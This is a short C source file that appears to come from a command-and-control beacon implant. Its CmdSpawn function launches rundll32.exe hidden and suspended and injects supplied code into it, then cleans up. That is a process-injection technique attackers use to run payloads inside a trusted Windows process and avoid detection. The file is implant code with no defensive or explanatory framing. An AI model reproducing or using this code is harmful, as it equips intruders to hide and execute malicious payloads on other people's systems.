#include "Spawn.h"
#include "DllInject.h"
#include "Api.h"
#include "Command.h"

VOID CmdSpawn(unsigned char* command, size_t command_length, BOOL x86, BOOL ignoreToken)
{
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi = { 0 };

	GetStartupInfoA(&si);

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE; 

	memset(&si.hStdInput, 0, sizeof(si.hStdInput));

	unsigned char* spawnProcess = "C:\\Windows\\System32\\rundll32.exe";
	if (!CreateProcessA(NULL, spawnProcess, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		fprintf(stderr, "CreateProcessA failed with error:%lu\n", GetLastError());
		return;
	}

	Sleep(100);
	InjectProcessLogic(&pi, pi.hProcess, pi.dwProcessId, command, command_length, 0, NULL, 0);

	BeaconCleanupProcess(&pi);
}
